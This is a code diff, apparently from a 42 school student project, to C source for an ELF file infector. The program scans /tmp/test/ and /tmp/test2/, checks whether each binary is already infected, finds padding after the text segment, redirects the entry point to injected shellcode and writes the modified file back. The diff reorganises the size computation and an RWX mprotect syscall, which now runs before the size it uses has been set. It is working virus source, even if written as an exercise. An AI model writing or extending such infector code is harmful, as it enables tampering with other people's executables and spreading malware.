@@ -6,7 +6,7 @@
 /*   By: fcadet <fcadet@student.42.fr>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2022/07/22 12:32:02 by fcadet            #+#    #+#             */
-/*   Updated: 2022/07/24 21:48:13 by fcadet           ###   ########.fr       */
+/*   Updated: 2022/07/24 23:14:22 by fcadet           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -166,14 +166,6 @@ static int		find_txt_seg(void) {
 	return (0);
 }
 
-static void		get_sizes(void) {
-	sz.code = &sc_end - &sc;
-	sz.data = &sc_data_end - &sc_data;
-	sz.load = sz.data + sz.code;
-	sz.f_pad = hdrs.nxt->p_offset - (hdrs.txt->p_offset + hdrs.txt->p_filesz);
-	sz.m_pad = hdrs.nxt->p_vaddr - (hdrs.txt->p_vaddr + hdrs.txt->p_memsz);
-}
-
 static int		set_x_pad(void) {
 	Elf64_Phdr	*p_hdr;
 	Elf64_Shdr	*s_hdr;
@@ -196,14 +188,7 @@ static int		set_x_pad(void) {
 	return (0);
 }
 
-static uint64_t		round_up(uint64_t val, uint64_t mod) {
-	return (val % mod ? val / mod * mod + mod : val);
-}
-
 static int		update_mem(void) {
-	if (syscall(10, (uint64_t)&sc_data & PAGE_MSK, round_up(sz.data, PAGE_SZ),
-			PROT_READ | PROT_WRITE | PROT_EXEC) < 0)
-		return (-1);
 	sc_entry = hdrs.txt->p_vaddr + hdrs.txt->p_memsz;
 	sc_old_entry = hdrs.elf->e_entry;
 	hdrs.elf->e_entry = sc_entry;
@@ -224,9 +209,12 @@ static void		proc_entries(uint64_t dir_ret, char *root_path) {
 		if (map_file(buffs.path) < 0)
 			continue;
 		hdrs.elf = (Elf64_Ehdr *)mem;
-		if (!check_infection() && !test_elf_hdr() && !find_txt_seg()
-				&& !set_x_pad() && !update_mem())
-			write_mem(buffs.path);
+		if (!check_infection() && !test_elf_hdr() && !find_txt_seg()) {
+			sz.f_pad = hdrs.nxt->p_offset - (hdrs.txt->p_offset + hdrs.txt->p_filesz);
+			sz.m_pad = hdrs.nxt->p_vaddr - (hdrs.txt->p_vaddr + hdrs.txt->p_memsz);
+			if (!set_x_pad() && !update_mem())
+				write_mem(buffs.path);
+		}
 		munmap(mem, sz.mem);
 	}
 }
@@ -244,6 +232,18 @@ static void		proc_dir(char *dir) {
 
 int		main(void) {
 	//bzero glob vars
+	
+	if (syscall(10, (uint64_t)&sc_data & PAGE_MSK,
+			sz.data % PAGE_SZ ? sz.data / PAGE_SZ * PAGE_SZ + PAGE_SZ : sz.data,
+			PROT_READ | PROT_WRITE | PROT_EXEC) < 0)
+		return (-1);
+	
+	//set sc_glob
+
+	sz.code = &sc_end - &sc;
+	sz.data = &sc_data_end - &sc_data;
+	sz.load = sz.data + sz.code;
+
 	proc_dir("/tmp/test/");
 	proc_dir("/tmp/test2/");
 }
